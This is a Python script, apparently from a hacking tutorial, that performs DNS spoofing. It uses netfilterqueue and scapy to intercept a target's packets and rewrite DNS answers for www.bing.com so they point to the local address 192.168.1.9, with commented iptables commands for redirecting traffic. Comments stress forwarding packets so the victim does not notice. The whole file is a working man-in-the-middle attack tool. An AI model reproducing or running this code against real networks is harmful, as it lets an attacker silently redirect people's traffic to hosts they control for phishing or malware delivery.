#!/usr/bin/python3

import subprocess
import scapy.all as scapy
import netfilterqueue


def process_packet(packet):
    # print(packet)
    # print(packet.get_payload())  # it will show me the actual content inside the packet itself
    scapy_packet = scapy.IP(packet.get_payload())  # convert the packet to scapy packet to access its Layers & Fields
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if 'www.bing.com' in str(qname):
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.9")  # Spoofing Answer
            # we assign (rrname + rdata) the fields that scapy don't assign them by default
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1  # assign ancount (answer count) to 1 cuz we create one response ;)

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept() # see the packet and forward it to the router, don't cut the internet from the target's perspective
    # packet.drop()


# subprocess.call(["sudo", "iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
# FORWARD => where the packets coming into my interface
# subprocess.call(["sudo", "iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
# OUTPUT => where the packets leaving my machine to go through
# subprocess.call(["sudo", "iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
# INPUT => the packets that are coming to my machine


queue = netfilterqueue.NetfilterQueue()
try:
    queue.bind(0, process_packet)
    queue.run()

except KeyboardInterrupt:
    print("\nFlush The iptables...")
    subprocess.call(["sudo", "iptables", "--flush"])
    print("Done!")



